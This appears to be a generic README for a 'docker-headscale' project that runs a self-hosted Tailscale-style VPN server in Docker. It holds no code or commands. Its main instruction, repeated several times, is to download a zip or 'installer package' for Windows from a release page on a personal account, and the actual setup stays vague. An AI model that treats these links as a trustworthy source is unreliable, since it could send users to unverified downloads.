# 🐳 docker-headscale - Run Your Own VPN Control Server

[![Download docker-headscale](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ritchiearistotelian98/docker-headscale/releases)

## 🚀 What This App Does

docker-headscale runs a Headscale server in Docker. It gives you a self-hosted way to manage a Tailscale-style mesh VPN. You can use the official Tailscale apps on your devices and connect them through your own server.

This setup helps you:

- Connect your devices over a private network
- Keep control of your VPN coordination server
- Use WireGuard-based networking
- Set up a mesh VPN without public exposure for your devices

## 📥 Download

Visit this page to download: [docker-headscale releases](https://github.com/ritchiearistotelian98/docker-headscale/releases)

Open the latest release, then download the file that matches your Windows setup. If the release offers a zip file or installer package, save it to your computer before you continue.

## 🖥️ What You Need

Before you start, make sure you have:

- A Windows PC
- An internet connection
- Docker Desktop or another Docker setup on Windows
- Enough free disk space for the app and its data
- The ability to run local apps on your computer

If you plan to connect more than one device, install the Tailscale client app on each device you want to use.

## 🛠️ Install on Windows

1. Go to the [releases page](https://github.com/ritchiearistotelian98/docker-headscale/releases).
2. Download the latest release file.
3. Save the file in a folder you can find again, such as Downloads or Desktop.
4. If the file is a zip archive, extract it.
5. Open Docker Desktop on Windows.
6. Place the project files where you want to keep them.
7. Open the folder that contains the Docker Compose file.
8. Start the stack with Docker Compose.

If you use a zip file from the release, it may include:

- A `docker-compose.yml` file
- A config folder
- Example data files
- A README for local setup

## ▶️ Run the Server

To start the server:

1. Open the folder that holds the project files.
2. Start Docker Desktop if it is not already running.
3. Use the Docker Compose file to bring up the service.
4. Wait until Docker finishes creating the container.
5. Check that the Headscale server is running.

After it starts, the server should listen on the local address set in the compose file. You can use that address from your browser or from the Tailscale client setup flow, based on the release files you downloaded.

## ⚙️ First-Time Setup

After the server starts, set up your Headscale account data and network settings.

Common setup tasks include:

- Creating an admin user
- Setting the server name
- Choosing the listen port
- Setting the data storage path
- Adding your device registration key
- Connecting your first client

If the release package includes sample config files, edit those files before the first run.

## 📱 Connect Your Devices

Once Headscale is running, install the Tailscale client app on each device you want to join.

Use this flow:

1. Install the Tailscale app on your Windows PC or other device.
2. Open the app.
3. Sign in or register it with your Headscale server, based on the setup steps in the release files.
4. Repeat for each device.
5. Confirm that each device shows as connected in your network list.

This lets your devices talk to each other through your own coordination server.

## 🔎 Check If It Works

Look for these signs that the server is working:

- Docker shows the container as running
- The server opens on the expected port
- Your client device joins the network
- Devices can see each other by VPN name or address
- The Tailscale app shows an active connection

If a device does not connect, check the config file, then restart the container.

## 🧩 Common Files You May See

A release package for this project may include:

- `docker-compose.yml` — starts the server
- `.env` — stores config values
- `config.yml` — holds Headscale settings
- `data/` — stores network data
- `certs/` — keeps TLS files if used

Keep these files in the same folder unless the release notes tell you to move them.

## 🔐 Basic Network Setup

For a smooth setup, keep these points in mind:

- Use a stable port that does not conflict with other apps
- Keep your data folder in a safe place
- Back up your config files before changes
- Use a strong admin password if the setup includes one
- Make sure your router allows the port you choose, if you want access from outside your home network

If you only want local testing, you can keep the server on your PC and connect devices on the same network

## 🧪 Example Use Cases

You can use docker-headscale for:

- A home VPN control server
- A private network for laptops and phones
- Remote access to home devices
- A self-hosted mesh VPN for family devices
- A lab network for testing connections

It works well when you want a private setup and do not want to rely on a third-party control server

## 🧰 Troubleshooting

If the app does not start:

- Check that Docker Desktop is running
- Make sure the compose file is in the right folder
- Confirm that no other app uses the same port
- Reopen the release files and check the config
- Restart the container after each change

If a device will not join:

- Check the server URL
- Confirm the registration key
- Make sure the Headscale server is up
- Verify the Tailscale client is set to use your server
- Try removing the device from the client and adding it again

## 📁 Suggested Folder Layout

A simple setup can use this structure:

- `docker-headscale/`
  - `docker-compose.yml`
  - `config.yml`
  - `data/`
  - `logs/`

This keeps the app files and the saved network data in one place

## 🔄 Updating

When a new release is posted:

1. Open the [releases page](https://github.com/ritchiearistotelian98/docker-headscale/releases).
2. Download the newest release file.
3. Stop the running container.
4. Replace the old files if the release notes say to do so.
5. Start Docker Compose again.

If your data folder stays in place, your saved settings and network data can remain intact

## 📎 Useful Terms

- **Headscale**: A self-hosted server that helps manage Tailscale-style devices
- **Tailscale client**: The app on your computer or phone that joins the network
- **WireGuard**: The secure network layer used for device traffic
- **Mesh VPN**: A network where devices can connect to each other
- **Docker**: A tool that runs apps in containers

## 🧭 What to Do Next

1. Open the [release page](https://github.com/ritchiearistotelian98/docker-headscale/releases)
2. Download the latest package
3. Start Docker Desktop on Windows
4. Open the project folder
5. Run the Docker Compose file
6. Connect your first device with the Tailscale client